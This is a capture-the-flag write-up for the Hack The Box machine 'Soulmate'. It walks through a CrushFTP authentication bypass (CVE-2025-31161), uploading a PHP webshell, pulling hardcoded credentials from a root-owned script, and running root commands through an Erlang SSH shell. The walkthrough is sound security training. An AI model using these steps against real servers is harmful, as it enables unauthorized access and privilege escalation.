---
title: Soulmate
date: 2025-10-30
description: Easy Linux machine exploiting CVE-2025-31161 for a CrushFTP authentication bypass, uploading a PHP webshell for initial access, recovering credentials from a root-owned script, and escalating privileges through an internal Erlang/OTP shell on port 2222 to gain root.
tags:
  - htb
  - Easy
  - Linux
---

# Initial Recon

`nmap` exposed SSH, HTTP, and an Erlang Port Mapper Daemon:

```bash
nmap -p22,80,4369 -A -oN scan_results.txt 10.10.11.86
```

```text
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.13
80/tcp   open  http    nginx 1.18.0 (Ubuntu)
4369/tcp open  epmd    Erlang Port Mapper Daemon
```

The web application on port `80` was a dating site titled **Soulmate - Find Your Perfect Match**. The textarea was tested for XSS — not vulnerable.

Subdomain enumeration with `ffuf` surfaced `ftp.soulmate.htb`:

```bash
ffuf -c -u "http://soulmate.htb" -H "HOST:FUZZ.soulmate.htb" -w /usr/share/seclists/Discovery/DNS/n0kovo_subdomains.txt -fw 4
```

Source code review revealed the frontend was running **CrushFTP 11**.

# User

## CrushFTP Auth Bypass

Research identified **CVE-2025-31161**, an authentication bypass allowing arbitrary admin user creation:

```bash
python3 cve-2025-31161.py --target_host ftp.soulmate.htb --port 80 --target_user root --new_user dante --password dante
```

Logged in as the newly created `dante` account and navigated to **Admin → User Manager → ben**. Generated a random password for `ben`, saved it, then re-authenticated as `ben`.

`ben` held the `webProd` directory — the web root backing `soulmate.htb`, containing all the site's PHP files.

## Webshell Upload

Uploaded a PHP webshell through **Add Files**, which landed directly in the web root:

```text
http://soulmate.htb/shell.php
```

Triggered a reverse shell callback and captured a foothold as `www-data`.

## Credential Recovery

Process monitoring with `pspy64` revealed root periodically executing a login script. Reviewing the script exposed hardcoded credentials:

```text
ben : HouseH0ldings998
```

SSH access was obtained:

```bash
ssh ben@<target>
```

# Root

The same script also spawned a service on port `2222`. A quick netcat connection returned an information disclosure banner, though commands failed due to protocol mismatch.

Research via HackTricks pointed to **Erlang Port Mapper Daemon (epmd)** on `4369` and an Erlang SSH interface on `2222`.

Connected to the internal Erlang shell:

```bash
ssh ben@localhost -p 2222
```

This granted an **Eshell** — the Erlang interactive shell — authenticated as `ssh_runner`. Loaded modules and executed system commands directly:

```erlang
m().
os:cmd("id").
```

The `os:cmd` call executed with root privileges. Flag captured and a stable root shell established.

Gained `root`
